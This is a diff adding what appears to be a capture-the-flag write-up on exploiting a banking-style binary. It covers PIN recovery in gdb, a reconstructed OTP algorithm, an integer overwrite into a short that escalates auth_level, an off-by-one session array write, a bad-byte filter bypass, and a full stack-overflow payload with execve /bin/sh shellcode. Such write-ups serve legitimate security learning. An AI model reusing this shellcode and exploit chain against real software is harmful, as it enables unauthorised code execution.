@@ -1,0 +1,318 @@
+First of all we need a PIN to exploit this program. Let's see if there is any pattern on the codes:
+
+52535372
+69545281
+85322685
+47314172
+94233394
+45222445
+58777758
+99981435
+
+I tried to understand the PIN generation process but I was getting angry. Instead we will breakpoint the
+of the verify_user() function:
+
+--------------------------------------------------------------------------------------------
+0x400f9f:  push    rbp
+0x400fa0:  mov     rbp, rsp
+0x400fa3:  sub     rsp, 0x20                ; current stack frame has 0x20 bytes
+0x400fa7:  mov     dword [rbp-0x4], 0x5     ; var1 = 5 (most likely attempts)
+0x400fae:  jmp     0x40107a
+0x400fb3:  mov     qword [rbp-0xe], 0x0      ; input buffer
+0x400fbb:  mov     word [rbp-0x6], 0x0       ; word=2bytes
+0x400fc1:  mov     qword [rbp-0x17], 0x0     ; probably another buffer
+0x400fc9:  mov     byte [rbp-0xf], 0x0       ; byte
+0x400fcd:  mov     eax, dword [rbp-0x4]
+0x400fd0:  mov     esi, eax
+0x400fd2:  lea     rdi, [rel aEnterloginpindat]  "Enter login pin (%d attempts rem…"
+0x400fd9:  mov     eax, 0x0
+0x400fde:  call    printfa
+0x400fe3:  mov     rdx, qword [rel stdin] ; 3rd argument stdin
+0x400fea:  lea     rax, [rbp-0xe]            ; loads input buffer
+0x400fee:  mov     esi, 0xa                  ; 10 bytes of input
+0x400ff3:  mov     rdi, rax
+0x400ff6:  call    fgets                     ; fgetd(buffer,10,stdin)
+0x400ffb:  lea     rax, [rbp-0xe]
+0x400fff:  lea     rsi, [rel data_401a2d]       ; x0a x00 => x0a = \n
+0x401006:  mov     rdi, rax
+0x401009:  call    strcspn                   ; strcspn(buffer,'\n') = 0
+0x40100e:  mov     byte [rbp+rax-0xe], 0x0   ;  = 0 from above
+0x401013:  lea     rax, [rbp-0xe]
+0x401017:  lea     rsi, [rel data_401a2f]       ; 71 00
+0x40101e:  mov     rdi, rax
+0x401021:  call    strcmp                    ; strcmp(buffer,'q')?
+0x401026:  test    eax, eax                  ; when you 'q' you log out
+0x401028:  je      0x401086
+0x40102a:  lea     rax, [rbp-0x17]          ; 2nd buffer
+0x40102e:  mov     rdi, rax
+0x401031:  call    generate_OTP
+0x401036:  lea     rdx, [rbp-0xe]
+0x40103a:  lea     rax, [rbp-0x17]          ; pincode generated
+0x40103e:  mov     rsi, rdx
+0x401041:  mov     rdi, rax
+0x401044:  call    strcmp                   ; compares our input with output of generate_OTP
+0x401049:  test    eax, eax
+0x40104b:  jne     0x40106a
+0x40104d:  lea     rdi, [rel aLoggingin]  "LOGGING IN..."
+0x401054:  call    puts
+0x401059:  mov     rax, qword [rel current_session]
+0x401060:  mov     dword [rax+0x28], 0x1
+0x401067:  nop     
+0x401068:  jmp     0x401087
+0x40106a:  lea     rdi, [rel data_401a40]  "\x1b[33;1mVERIFICATION FAILED\x1b…"
+0x401071:  call    puts
+0x401076:  sub     dword [rbp-0x4], 0x1     ; i-1
+0x40107a:  cmp     dword [rbp-0x4], 0x0     ; i=0
+0x40107e:  jne     0x400fb3                 ; while(i =! 0)
+0x401084:  jmp     0x401087
+0x401086:  nop     
+0x401087:  leave   
+0x401088:  retn    
+--------------------------------------------------------------------------------------------
+
+To get the PIN:
+
+b *0x401044
+ni
+x/s $rbp-0x17
+
+To login keep the breakpoint, and just put the code and spam enter/ continue in the debugger.
+
+You need to do this for every run (we can do this easily in pwn tools but here I don't know).
+
+And we are inside the account!
+
+session_id = 8 bytes
+last_transaction = 32 bytes
+auth_level => int => 4 bytes
+time_t session_start => 8 bytes (ISO...)
+
+Total bytes for session struct => 52 bytes
+
+The problem lies here:
+
+short choice = get_number();
+
+The function get_number() calls get_uint(). The function get_number() is just shitty obfuscation.
+
+The function get_uint():
+
+0x400a87:  push    rbp
+0x400a88:  mov     rbp, rsp
+0x400a8b:  sub     rsp, 0x10                 ; stack frame of 0x10 bytes
+0x400a8f:  mov     dword [rbp-0x4], 0x0      ; int x = 0
+0x400a96:  mov     rax, qword [rel stdout]
+0x400a9d:  mov     rdi, rax
+0x400aa0:  call    fflush                    ; fflush(stdout)
+0x400aa5:  lea     rax, [rbp-0x4]            ; loads x
+0x400aa9:  mov     rsi, rax
+0x400aac:  lea     rdi, [rel data_40154d]
+0x400ab3:  mov     eax, 0x0
+0x400ab8:  call    __isoc99_scanf            ; scanf(<format>,x)
+0x400abd:  call    clear_stdin               ; cleans input
+0x400ac2:  mov     eax, dword [rbp-0x4]      ; output of the function
+0x400ac5:  leave   
+0x400ac6:  retn
+
+So basically we input an integer inside a short.
+This will override 2 bytes.
+
+If we notice the session struct:
+
+typedef struct session
+{
+    char session_id[8];
+    char last_transaction[32];
+    int auth_level;
+    short balance;
+    time_t session_start;
+} Session;
+
+The 2 bytes we can override are the auth_level since they are after the last_transction (our input).
+
+There are several auth_levels:
+
+#define PRIV_NONE        0
+#define PRIV_AUTHORIZED  1
+#define PRIV_DEBUG       2
+
+We want the PRIV_DEBUG.
+
+So we need to give out a number that overrides the last 2 bytes to 02.
+
+2^16 = 65536 (max number)
+2^32 = 4294967295 (max number)
+
+65636 + 0x02 = 6563602
+
+Now press the 4 (logout) option.
+And it worked we can now debug a transaction.
+
+g_session_count is in 0x603128.
+x/20s $rbp-0x17
+
+Got the session:
+SESH0
+
+Now we need to find the vulnerability of the debug_transaction. There is also a function called debug_menu that might be worth checking out.
+
+Most likely place with a problem is the CUSTOM TRANSACTION input because check_for_bad_bytes is called on it. check_for_bad_bytes iterates over the input from
+CUSTOM TRANSACTION looking for 0x3b (syscall).
+
+We can bypass this by 0x3a + 1 in our shellcode instead.
+
+Now time to automate ALL of this which means we must figure out the entire code generation algorithm and can't do the the manual way x/s $rbp-0x17.
+
+After a couple of hours and checking every register in every step of the code generation this is what worked for me.
+
+
+set *(int*)($rbp-0x4)=1 (to test the loop)
+while i <= 7:
+    print("----------------------------")
+    var0=i*2
+    var1 = (constant1 >> var0) & 0xFF
+    print(f"var1: 0x{var1:x} when {i}")
+    var2 = var1 ^ timestamp
+    print(f"var2: 0x{var2:x} when {i}")
+    #Chatgpt won't save u from this part below
+    var3 = ((constant2 * var2) & 0xFFFFFFFF00000000) >> 32 #EDX:EAX
+    print(f"var3: 0x{var3:x} when {i}")
+    var4 = var3 >> 1
+    print(f"var4: 0x{var4:x} when {i}")
+    var5 = var2 >> 31
+    print(f"var5: 0x{var5:x} when {i}")
+    var6 = var4 - var5
+    print(f"var6: 0x{var6:x} when {i}")
+    var7 = var6 << 3
+    print(f"var7: 0x{var7:x} when {i}")
+    var8 = var7 + var6
+    print(f"var8: 0x{var8:x} when {i}")
+    var9 = var2 - var8
+    print(f"var9: 0x{var9:x} when {i}")
+    ####Confirmed with registers
+    #I tought this was it but then I noticed that the code generated
+    #for a given timestamp is missing +1, for example 
+    #for a given timestamp the code was this: 54627718
+    #But the generated code was: 0x4,0x3,0x5,0x1,0x6,0x6,0x0,0x7.
+    #So maybe I missed something but we need to add +1 and we get the code
+    var10 = var9 + 1
+    code += f"{var10}" 
+    print(f"The code is: {code} when {i}")
+    #Confirmed with x/s $rbp-0x17
+    i = i + 1
+
+
+While investigating further I couldn't overwrite the CUSTOM TRANSACTION input since it's sanitized so let's investigate the debug_menu function:
+
+1. There is an issue to the function itself. You can write out of bounds. In simple terms this happends behind the scenes:
+
+```
+session_t sesh[4];
+
+for(int i = 0; i <= 4; i++) {
+  sesh[i] = create_session();
+}
+```
+
+The vector index begins at 0 therefore index will be in this order: 0 1 2 3 (size 4). The loop however will try to write on sesh[4] which doesn't exist!
+This way we can add a transaction to a non existing session.
+
+This means we can add a fifth session that is out of bounds/doesn't exist.
+
+We tried to add a debug transaction to the new account and after trying to overflow the buffers we got on the CUSTOM_TRANSACTION a segmentation fault :D.
+
+We know that the debug_transaction function takes 32 bytes but since this session doesn't exist we might need less bytes since some other random bytes might be in memory.
+
+With 23 bytes we alredy get a segfault with rbp: 0x0a41414141414141. With 24 bytes the rbp is completely full of A's.
+
+So our final payload will be our shellcode (with 0x3a+1 since 0x3b is banned) + pointer to our shellcode in the stack.
+
+Our shellcode:
+
+```
+xor rsi, rsi
+push rsi
+mov rdi, 0x68732f2f6e69622f
+push rdi
+push rsp
+pop rdi
+push 0x3a
+pop rax
+inc rax
+syscall
+```
+
+Let's get the size of our payload, then add the padding in the left and right side.
+
+payload = "\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x57\x54\x5F\x6A\x3A\x58\x48\xFF\xC0\x0F\x05"
+print(len(payload))
+
+We get 25. We can cut one \x2F to get 24 (/bin/sh is the same as /bin//sh),
+
+After some time I tried to run the code directly from the debug transaction, but didn't work. After some inspection it seems that the registers are the ones that have my shellcode this means it isn't in the stack
+and therefore I can't run it.
+
+What we can do is in another transaction add our shellcode (it goes to the stack) then create the sessions then overflow the buffer and point the rip to our location in the stack that has the shellcode.
+
+How to find our input in the stack?
+
+1. Send a dummy payload:
+p.sendline(b'FUCKFUCKFUCK')
+
+2. Check where the stack starts and ends:
+vmmap
+0x7ffffffde000-0x7ffffffff000 rwx [stack]
+
+3. Use the find command to find it.
+find 0x7ffffffde000 0x7ffffffff000 "FUCKFUCKFUCK"
+
+4. Profit?
+Found target at: 
+0x7fffffffedd0
+
+So we have 31 bytes (fgets last byte is \x00, so 32-1=31 bytes) and an extra 7 bytes (buffer is 8 bytes so fgets 7-1 bytes).
+
+We can save 1 byte because fgets adds a \x00 at the end of the input and since our address is 0x7fffffffedd0, when translated to little endian it will look like this:
+
+\xd0\xed\xff\xff\xff\x7f\x00 the final \x00 is automatically added to the address :D
+
+Here comes the tricky part the address is 8 bytes and the payload 24, but the fgets is 31 bytes max. We need to split the payload.
+
+We need to find out where the last 7 bytes of the payload are stored in stack:
+find 0x7ffffffde000 0x7ffffffff000 "FUCKFUC"
+
+The last 6 bytes are stored in 0x7fffffffedc9. This means we need to perform a NEGATIVE jump.
+
+First I will split the payload at the \xE7 byte and add padding:
+\x90\x90\x90\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x31\xF6\x48\x89\x3C\x24\x48\x89\xE7\<jump byte1>\<jump byte2>
+
+Now I add the address but using our trick above (no p64):
+\xd0\xed\xff\xff\xff\x7f\x00
+
+And the last 7 bytes of the payload with a \x00 at the end:
+\xB0\x3A\x04\x01\x0F\x05\x00
+
+All we need to do is calculate the jump AND another bonus thing is the /bin/sh:
+
+1. Check our buffer input just to make sure:
+x/32b 0x7fffffffedd0
+
+2. Add to our payload the jump instruction byte code:
+\xEB
+
+3. What I like to first add a random guess on the jump instruction and check it with the following:
+x/10i
+
+4. Something like this will appear:
+jmp 0xfff11234
+
+5.Change the amount of jump in the <jump byte2>, in our case the jump will be like so:
+\xEB\xE0
+
+6. Combine the entire payload and you get a shell:
+p.sendline(b"\x90\x90\x90\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x31\xF6\x48\x89\x3C\x24\x48\x89\xE7\xEB\xE0"+ b"\xd0\xed\xff\xff\xff\x7f\x00" + b"\xB0\x3A\x04\x01\x0F\x05")
+
+
+The other bonus was, due to random stack values present you must at \x00 at the end of your /bin/sh, so instead of /bin//sh you do /bin/sh\x00.
+
+The / removed it's so that the payload has the correct amount of bytes for padding and because of the fgets.
